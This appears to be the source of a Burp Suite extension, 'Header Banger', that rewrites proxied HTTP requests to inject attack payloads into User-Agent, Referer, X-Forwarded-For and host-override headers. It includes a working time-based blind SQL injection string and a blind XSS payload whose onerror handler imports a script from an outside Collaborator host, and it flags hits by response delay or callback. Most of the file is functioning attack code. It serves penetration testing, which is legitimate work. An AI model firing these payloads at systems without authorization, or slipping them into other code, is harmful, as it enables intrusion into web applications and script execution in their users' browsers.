package slicingmelon.burpheaderbanger;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.proxy.http.InterceptedRequest;
import burp.api.montoya.proxy.http.InterceptedResponse;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.proxy.http.ProxyRequestToBeSentAction;
import burp.api.montoya.proxy.http.ProxyResponseHandler;
import burp.api.montoya.proxy.http.ProxyResponseReceivedAction;
import burp.api.montoya.proxy.http.ProxyResponseToBeSentAction;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.scancheck.ActiveScanCheck;
import burp.api.montoya.scanner.scancheck.PassiveScanCheck;
import burp.api.montoya.scanner.scancheck.ScanCheckType;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.http.Http;

import static burp.api.montoya.scanner.AuditResult.auditResult;
import static burp.api.montoya.scanner.ConsolidationAction.KEEP_EXISTING;
import static java.util.Collections.emptyList;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;

import javax.swing.*;
import java.awt.*;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, ProxyResponseHandler, 
        ActiveScanCheck, PassiveScanCheck, ContextMenuItemsProvider {

    private static final String VERSION = "0.0.1";
    private static final int MAX_DICTIONARY_SIZE = 5000;
    private static final int DEFAULT_SQLI_SLEEP_TIME = 17;
    
    private static final Set<String> SKIP_CONTENT_TYPES = Set.of(
            "image/png", "image/jpeg", "image/jpg", "image/gif",
            "video/webm", "video/mp4", "text/event-stream",
            "application/octet-stream", "font/woff", "font/woff2"
    );

    private MontoyaApi api;
    private PersistedObject persistedObject;
    private CollaboratorClient collaboratorClient;
    private ScheduledExecutorService scheduler;
    
    // Settings
    private boolean extensionActive = true;
    private boolean onlyInScopeItems = false;
    private int attackMode = 2; // 1 = Blind SQLi, 2 = Blind XSS
    private int sqliSleepTime = DEFAULT_SQLI_SLEEP_TIME;
    
    // Headers and payloads
    private List<String> headers = new ArrayList<>();
    private List<String> sensitiveHeaders = new ArrayList<>();
    private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
    private String bxssPayload = "";
    private List<String> skipHosts = new ArrayList<>();
    private List<String> injectedHeaders = new ArrayList<>();
    private List<String> extraHeaders = new ArrayList<>();
    private boolean overwriteExtraHeaders = true; // true = overwrite, false = add only if not exists
    
    // UI Components
    private HeaderBangerTab headerBangerTab;
    
    // Request timing tracking
    private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
    
    // Default headers
    private static final List<String> DEFAULT_HEADERS = Arrays.asList(
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "Forwarded",
            "True-Client-IP",
            "X-Client-IP",
            "X-Cluster-Client-IP",
            "X-Originating-IP",
            "CF-Connecting-IP",
            "Fastly-Client-IP"
    );
    
    private static final List<String> DEFAULT_SENSITIVE_HEADERS = Arrays.asList(
            "X-Host", "X-Forwarded-Host", "X-Forwarded-Server",
            "X-HTTP-Host-Override", "Forwarded", "Origin",
            "X-Original-URL", "X-Rewrite-URL"
    );
    
    private static final List<String> DEFAULT_SKIP_HOSTS = Arrays.asList(
            "player.vimeo.com", "example3.com"
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.persistedObject = api.persistence().extensionData();
        this.collaboratorClient = api.collaborator().createClient();
        this.scheduler = Executors.newScheduledThreadPool(2);
        
        // Set extension name
        api.extension().setName("Header Banger");
        
        // Load settings
        loadSettings();
        
        // Initialize collaborator payload
        initializeCollaboratorPayload();
        
        // Update injected headers
        updateInjectedHeaders();
        
        // Register handlers
        api.proxy().registerRequestHandler(this);
        api.proxy().registerResponseHandler(this);
        api.scanner().registerActiveScanCheck(this, ScanCheckType.PER_REQUEST);
        api.scanner().registerPassiveScanCheck(this, ScanCheckType.PER_REQUEST);
        api.userInterface().registerContextMenuItemsProvider(this);
        
        // Create and register UI
        headerBangerTab = new HeaderBangerTab(this, api);
        api.userInterface().registerSuiteTab("Header Banger", headerBangerTab.getTabbedPane());
        
        // Start collaborator polling
        startCollaboratorPolling();
        
        api.logging().logToOutput("Header Banger v" + VERSION + " loaded successfully");
    }

    private void loadSettings() {
        // Load extension active state
        if (persistedObject.getBoolean("extensionActive") != null) {
            extensionActive = persistedObject.getBoolean("extensionActive");
        }
        
        // Load only in scope setting
        if (persistedObject.getBoolean("onlyInScopeItems") != null) {
            onlyInScopeItems = persistedObject.getBoolean("onlyInScopeItems");
        }
        
        // Load attack mode
        if (persistedObject.getInteger("attackMode") != null) {
            attackMode = persistedObject.getInteger("attackMode");
        }
        
        // Load headers
        String headersJson = persistedObject.getString("headers");
        if (headersJson != null && !headersJson.isEmpty()) {
            headers = new ArrayList<>(Arrays.asList(headersJson.split(",")));
        } else {
            headers = new ArrayList<>(DEFAULT_HEADERS);
        }
        
        // Load sensitive headers
        String sensitiveHeadersJson = persistedObject.getString("sensitiveHeaders");
        if (sensitiveHeadersJson != null && !sensitiveHeadersJson.isEmpty()) {
            sensitiveHeaders = new ArrayList<>(Arrays.asList(sensitiveHeadersJson.split(",")));
        } else {
            sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
        }
        
        // Load skip hosts
        String skipHostsJson = persistedObject.getString("skipHosts");
        if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
            skipHosts = new ArrayList<>(Arrays.asList(skipHostsJson.split(",")));
        } else {
            skipHosts = new ArrayList<>(DEFAULT_SKIP_HOSTS);
        }
        
        // Load payloads
        String savedSqliPayload = persistedObject.getString("sqliPayload");
        if (savedSqliPayload != null) {
            sqliPayload = savedSqliPayload;
        }
        
        String savedBxssPayload = persistedObject.getString("bxssPayload");
        if (savedBxssPayload != null) {
            bxssPayload = savedBxssPayload;
        }
        
        // Load extra headers
        String extraHeadersJson = persistedObject.getString("extraHeaders");
        if (extraHeadersJson != null && !extraHeadersJson.isEmpty()) {
            extraHeaders = new ArrayList<>(Arrays.asList(extraHeadersJson.split(",")));
        }
        
        // Load overwrite setting
        if (persistedObject.getBoolean("overwriteExtraHeaders") != null) {
            overwriteExtraHeaders = persistedObject.getBoolean("overwriteExtraHeaders");
        }
        
        // Extract sleep time from SQLi payload
        extractSqliSleepTime();
    }

    public void saveSettings() {
        persistedObject.setBoolean("extensionActive", extensionActive);
        persistedObject.setBoolean("onlyInScopeItems", onlyInScopeItems);
        persistedObject.setInteger("attackMode", attackMode);
        persistedObject.setString("headers", String.join(",", headers));
        persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
        persistedObject.setString("skipHosts", String.join(",", skipHosts));
        persistedObject.setString("sqliPayload", sqliPayload);
        persistedObject.setString("bxssPayload", bxssPayload);
        persistedObject.setString("extraHeaders", String.join(",", extraHeaders));
        persistedObject.setBoolean("overwriteExtraHeaders", overwriteExtraHeaders);
    }

    // Getter and setter methods for UI access
    public boolean isExtensionActive() { return extensionActive; }
    public void setExtensionActive(boolean active) { this.extensionActive = active; }
    
    public boolean isOnlyInScopeItems() { return onlyInScopeItems; }
    public void setOnlyInScopeItems(boolean onlyInScope) { this.onlyInScopeItems = onlyInScope; }
    
    public boolean isOverwriteExtraHeaders() { return overwriteExtraHeaders; }
    public void setOverwriteExtraHeaders(boolean overwrite) { this.overwriteExtraHeaders = overwrite; }
    
    public int getAttackMode() { return attackMode; }
    public void setAttackMode(int mode) { this.attackMode = mode; }

    // Remove old UI creation methods - they're now in HeaderBangerTab.java
    
    public List<String> getHeaders() { return headers; }
    public List<String> getSensitiveHeaders() { return sensitiveHeaders; }
    public List<String> getExtraHeaders() { return extraHeaders; }
    public List<String> getSkipHosts() { return skipHosts; }
    
    public String getSqliPayload() { return sqliPayload; }
    public void setSqliPayload(String payload) { this.sqliPayload = payload; }
    
    public String getBxssPayload() { return bxssPayload; }
    public void setBxssPayload(String payload) { this.bxssPayload = payload; }
    
    public CollaboratorClient getCollaboratorClient() { return collaboratorClient; }
    
    public List<String> getDefaultHeaders() { return new ArrayList<>(DEFAULT_HEADERS); }
    public List<String> getDefaultSensitiveHeaders() { return new ArrayList<>(DEFAULT_SENSITIVE_HEADERS); }

    private void initializeCollaboratorPayload() {
        if (bxssPayload.isEmpty()) {
            CollaboratorPayload payload = collaboratorClient.generatePayload();
            bxssPayload = "Mozilla\"><img/src/onerror=import('//" + payload.toString() + "')>";
        }
    }

    public void extractSqliSleepTime() {
        Pattern pattern = Pattern.compile("sleep\\((\\d+)\\)", Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(sqliPayload);
        if (matcher.find()) {
            sqliSleepTime = Integer.parseInt(matcher.group(1));
        }
    }

    public void updateInjectedHeaders() {
        injectedHeaders.clear();
        String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
        
        for (String header : headers) {
            if ("Referer".equals(header)) {
                continue; // Handle Referer separately
            }
            
            if ("User-Agent".equals(header)) {
                if (attackMode == 1) {
                    // For SQLi, keep the Mozilla prefix
                    injectedHeaders.add("User-Agent: Mozilla/5.0" + currentPayload);
                } else {
                    // For XSS, just use the payload directly
                    injectedHeaders.add("User-Agent: " + currentPayload);
                }
            } else {
                injectedHeaders.add(header + ": 1" + currentPayload);
            }
        }
        
        // Add extra headers
        injectedHeaders.addAll(extraHeaders);
    }

    private void startCollaboratorPolling() {
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                List<Interaction> interactions = collaboratorClient.getAllInteractions();
                for (Interaction interaction : interactions) {
                    api.logging().logToOutput("🚀 SUCCESSFUL XSS DETECTED! 🚀");
                    api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                    
                    // Log detailed interaction information
                    api.logging().logToOutput("📋 Interaction Details:");
                    api.logging().logToOutput("  • ID: " + interaction.id());
                    api.logging().logToOutput("  • Type: " + interaction.type());
                    api.logging().logToOutput("  • Time: " + new java.util.Date());
                    api.logging().logToOutput("  • Payload: " + bxssPayload);
                    api.logging().logToOutput("  • Headers Used: " + getCurrentAttackHeaders());
                    
                    // Log basic interaction type information
                    if (interaction.dnsDetails().isPresent()) {
                        api.logging().logToOutput("  • Interaction Type: DNS");
                    }
                    
                    if (interaction.httpDetails().isPresent()) {
                        api.logging().logToOutput("  • Interaction Type: HTTP");
                    }
                    
                    if (interaction.smtpDetails().isPresent()) {
                        api.logging().logToOutput("  • Interaction Type: SMTP");
                    }
                    
                    api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                    
                    // Create XSS issue
                    createXssIssue(interaction);
                }
            } catch (Exception e) {
                api.logging().logToError("Error polling collaborator: " + e.getMessage());
            }
        }, 30, 30, TimeUnit.SECONDS);
    }

    private void createXssIssue(Interaction interaction) {
        // Enhanced XSS issue creation with more context
        api.logging().logToOutput("💥 XSS VULNERABILITY CONFIRMED!");
        api.logging().logToOutput("🎯 Attack Vector: Header injection via " + getCurrentAttackHeaders());
        api.logging().logToOutput("🔍 Payload Used: " + bxssPayload);
        api.logging().logToOutput("⚡ Impact: Cross-Site Scripting (XSS) execution detected");
        api.logging().logToOutput("🕐 Detected: " + new java.util.Date());
        api.logging().logToOutput("📊 Interaction ID: " + interaction.id());
        
        // TODO: Create proper Burp issue in future versions
        api.logging().logToOutput("📝 Note: This will be converted to a proper Burp issue in future versions");
        api.logging().logToOutput("───────────────────────────────────────────────────────────");
    }
    
    private String getCurrentAttackHeaders() {
        StringBuilder attackHeaders = new StringBuilder();
        for (String header : headers) {
            if (attackHeaders.length() > 0) attackHeaders.append(", ");
            attackHeaders.append(header);
        }
        return attackHeaders.toString();
    }

    // Utility methods for header handling
    private List<HttpHeader> convertToHttpHeaders(List<String> headerStrings) {
        List<HttpHeader> httpHeaders = new ArrayList<>();
        for (String headerString : headerStrings) {
            String[] parts = headerString.split(":", 2);
            if (parts.length == 2) {
                httpHeaders.add(HttpHeader.httpHeader(parts[0].trim(), parts[1].trim()));
            }
        }
        return httpHeaders;
    }

    private String getHeaderValue(List<HttpHeader> headers, String headerName) {
        for (HttpHeader header : headers) {
            if (header.name().equalsIgnoreCase(headerName)) {
                return header.value();
            }
        }
        return null;
    }

    private List<HttpHeader> addOrReplaceHeaders(List<HttpHeader> originalHeaders, List<String> headersToAdd) {
        List<HttpHeader> newHeaders = new ArrayList<>();
        
        // Add original headers, excluding ones we're going to replace
        for (HttpHeader header : originalHeaders) {
            boolean shouldReplace = false;
            for (String headerToAdd : headersToAdd) {
                String[] parts = headerToAdd.split(":", 2);
                if (parts.length == 2 && parts[0].trim().equalsIgnoreCase(header.name())) {
                    shouldReplace = true;
                    break;
                }
            }
            if (!shouldReplace) {
                newHeaders.add(header);
            }
        }
        
        // Add new headers
        for (String headerToAdd : headersToAdd) {
            String[] parts = headerToAdd.split(":", 2);
            if (parts.length == 2) {
                String headerName = parts[0].trim();
                String headerValue = parts[1].trim();
                
                // Check if we should add or skip (if overwriteExtraHeaders is false)
                if (!overwriteExtraHeaders) {
                    boolean exists = originalHeaders.stream()
                            .anyMatch(h -> h.name().equalsIgnoreCase(headerName));
                    if (exists) {
                        continue; // Skip this header
                    }
                }
                
                newHeaders.add(HttpHeader.httpHeader(headerName, headerValue));
            }
        }
        
        return newHeaders;
    }

    // ProxyRequestHandler implementation
    @Override
    public ProxyRequestReceivedAction handleRequestReceived(InterceptedRequest interceptedRequest) {
        if (!extensionActive) {
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        HttpRequest request = interceptedRequest;
        
        // Check if only processing in-scope items
        if (onlyInScopeItems && !api.scope().isInScope(request.url())) {
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        // Check if host should be skipped
        String host = request.httpService().host();
        if (skipHosts.contains(host)) {
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        // Modify request headers
        HttpRequest modifiedRequest = modifyRequestHeaders(request);
        
        // Store timestamp for response time analysis
        String requestKey = request.url();
        requestTimestamps.put(requestKey, System.currentTimeMillis());
        
        // Limit dictionary size
        if (requestTimestamps.size() > MAX_DICTIONARY_SIZE) {
            String oldestKey = requestTimestamps.entrySet().stream()
                    .min(Map.Entry.comparingByValue())
                    .map(Map.Entry::getKey)
                    .orElse(null);
            if (oldestKey != null) {
                requestTimestamps.remove(oldestKey);
            }
        }

        return ProxyRequestReceivedAction.continueWith(modifiedRequest);
    }

    @Override
    public ProxyRequestToBeSentAction handleRequestToBeSent(InterceptedRequest interceptedRequest) {
        return ProxyRequestToBeSentAction.continueWith(interceptedRequest);
    }

    // ProxyResponseHandler implementation
    @Override
    public ProxyResponseReceivedAction handleResponseReceived(InterceptedResponse interceptedResponse) {
        if (!extensionActive || attackMode == 2) {
            return ProxyResponseReceivedAction.continueWith(interceptedResponse);
        }

        // Process response for SQL injection detection
        processResponseForSqli(interceptedResponse);
        
        // Launch separate scan for sensitive headers
        scheduler.execute(() -> processSensitiveHeadersScan(interceptedResponse));

        return ProxyResponseReceivedAction.continueWith(interceptedResponse);
    }

    @Override
    public ProxyResponseToBeSentAction handleResponseToBeSent(InterceptedResponse interceptedResponse) {
        return ProxyResponseToBeSentAction.continueWith(interceptedResponse);
    }

    private HttpRequest modifyRequestHeaders(HttpRequest request) {
        List<HttpHeader> originalHeaders = request.headers();
        List<String> headersToAdd = new ArrayList<>();
        
        // Get base headers (exclude injected ones only)
        List<HttpHeader> baseHeaders = new ArrayList<>();
        for (HttpHeader header : originalHeaders) {
            if (!headers.contains(header.name())) {
                baseHeaders.add(header);
            }
        }

        // Handle Referer header separately
        String refererValue = getHeaderValue(originalHeaders, "Referer");
        
        // Add injected headers
        headersToAdd.addAll(injectedHeaders);
        
        // Add modified Referer if it was present
        if (refererValue != null && headers.contains("Referer")) {
            String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
            headersToAdd.add("Referer: " + refererValue + currentPayload);
        }

        List<HttpHeader> newHeaders = addOrReplaceHeaders(baseHeaders, headersToAdd);
        return request.withUpdatedHeaders(newHeaders);
    }

    private void processResponseForSqli(InterceptedResponse interceptedResponse) {
        // Check content type
        String contentType = getHeaderValue(interceptedResponse.headers(), "Content-Type");
        if (contentType != null) {
            String[] parts = contentType.split(";");
            if (parts.length > 0) {
                String mimeType = parts[0].trim().toLowerCase();
                if (SKIP_CONTENT_TYPES.contains(mimeType)) {
                    return;
                }
            }
        }

        // Check response time using the request URL from the intercepted response
        String requestKey = interceptedResponse.request().url();
        Long startTime = requestTimestamps.get(requestKey);
        if (startTime != null) {
            long responseTime = System.currentTimeMillis() - startTime;
            requestTimestamps.remove(requestKey);
            
            if (responseTime >= sqliSleepTime * 1000) {
                // Create SQL injection issue
                createSqlInjectionIssue(interceptedResponse, responseTime);
            }
        }
    }

    private void processSensitiveHeadersScan(InterceptedResponse interceptedResponse) {
        HttpRequest originalRequest = interceptedResponse.request();
        HttpService httpService = originalRequest.httpService();
        
        // Get host value
        String hostValue = getHeaderValue(originalRequest.headers(), "Host");
        if (hostValue == null) {
            return;
        }

        // Create modified request with sensitive headers
        List<String> headersToAdd = new ArrayList<>();
        
        // Add sensitive headers with payloads
        String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
        for (String sensitiveHeader : sensitiveHeaders) {
            headersToAdd.add(sensitiveHeader + ": " + hostValue + currentPayload);
        }

        // Add extra headers
        headersToAdd.addAll(extraHeaders);

        List<HttpHeader> newHeaders = addOrReplaceHeaders(originalRequest.headers(), headersToAdd);
        HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(newHeaders);
        
        try {
            long startTime = System.currentTimeMillis();
            HttpRequestResponse response = api.http().sendRequest(modifiedRequest);
            long endTime = System.currentTimeMillis();
            long responseTime = endTime - startTime;

            if (attackMode == 1 && responseTime >= sqliSleepTime * 1000) {
                createSensitiveHeaderSqlIssue(response, responseTime);
            }
        } catch (Exception e) {
            api.logging().logToError("Error sending sensitive headers request: " + e.getMessage());
        }
    }

    private void createSqlInjectionIssue(InterceptedResponse interceptedResponse, long responseTime) {
        // Just log the issue since we're handling this through proxy, not through scanner
        api.logging().logToOutput("Possible Blind SQL Injection detected! Response time: " + responseTime + " ms at URL: " + interceptedResponse.request().url());
    }

    private void createSensitiveHeaderSqlIssue(HttpRequestResponse response, long responseTime) {
        // Just log the issue since we're handling this through proxy, not through scanner
        api.logging().logToOutput("Possible Blind SQL Injection via sensitive headers detected! Response time: " + responseTime + " ms at URL: " + response.request().url());
    }

    // ActiveScanCheck implementation
    @Override
    public String checkName() {
        return "Header Banger";
    }

    @Override
    public AuditResult doCheck(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint, Http http) {
        return auditResult(emptyList()); // We handle scanning through proxy
    }

    @Override
    public AuditResult doCheck(HttpRequestResponse baseRequestResponse) {
        return auditResult(emptyList()); // We handle scanning through proxy
    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue existingIssue, AuditIssue newIssue) {
        return KEEP_EXISTING; // Keep the existing issue
    }

    // ContextMenuItemsProvider implementation
    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuItems = new ArrayList<>();
        
        JMenuItem scanItem = new JMenuItem("Scan this request with Header Banger");
        scanItem.addActionListener(_ -> scanSelectedRequest(event));
        menuItems.add(scanItem);
        
        JMenuItem excludeHostItem = new JMenuItem("Exclude Host from Header Banger scans");
        excludeHostItem.addActionListener(_ -> excludeHostFromScans(event));
        menuItems.add(excludeHostItem);
        
        return menuItems;
    }

    private void scanSelectedRequest(ContextMenuEvent event) {
        Optional<HttpRequestResponse> selectedMessage = event.selectedRequestResponses().stream().findFirst();
        if (selectedMessage.isPresent()) {
            // Create a simplified sensitive headers scan for context menu
            scheduler.execute(() -> {
                HttpRequest originalRequest = selectedMessage.get().request();
                String hostValue = getHeaderValue(originalRequest.headers(), "Host");
                
                if (hostValue != null) {
                    List<String> headersToAdd = new ArrayList<>();
                    String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
                    
                    for (String sensitiveHeader : sensitiveHeaders) {
                        headersToAdd.add(sensitiveHeader + ": " + hostValue + currentPayload);
                    }
                    
                    headersToAdd.addAll(extraHeaders);
                    
                    List<HttpHeader> newHeaders = addOrReplaceHeaders(originalRequest.headers(), headersToAdd);
                    HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(newHeaders);
                    
                    try {
                        long startTime = System.currentTimeMillis();
                        HttpRequestResponse response = api.http().sendRequest(modifiedRequest);
                        long endTime = System.currentTimeMillis();
                        long responseTime = endTime - startTime;
                        
                        if (attackMode == 1 && responseTime >= sqliSleepTime * 1000) {
                            api.logging().logToOutput("Context menu scan: Possible Blind SQL Injection detected! Response time: " + responseTime + " ms at URL: " + originalRequest.url());
                        } else {
                            api.logging().logToOutput("Context menu scan: Request completed in " + responseTime + " ms for URL: " + originalRequest.url());
                        }
                    } catch (Exception e) {
                        api.logging().logToError("Error in context menu scan: " + e.getMessage());
                    }
                }
            });
        }
    }

    private void excludeHostFromScans(ContextMenuEvent event) {
        Optional<HttpRequestResponse> selectedMessage = event.selectedRequestResponses().stream().findFirst();
        if (selectedMessage.isPresent()) {
            String host = selectedMessage.get().request().httpService().host();
            if (!skipHosts.contains(host)) {
                skipHosts.add(host);
                saveSettings();
                api.logging().logToOutput("Host " + host + " added to the exclusion list");
            } else {
                api.logging().logToOutput("Host " + host + " is already in the exclusion list");
            }
        }
    }
}

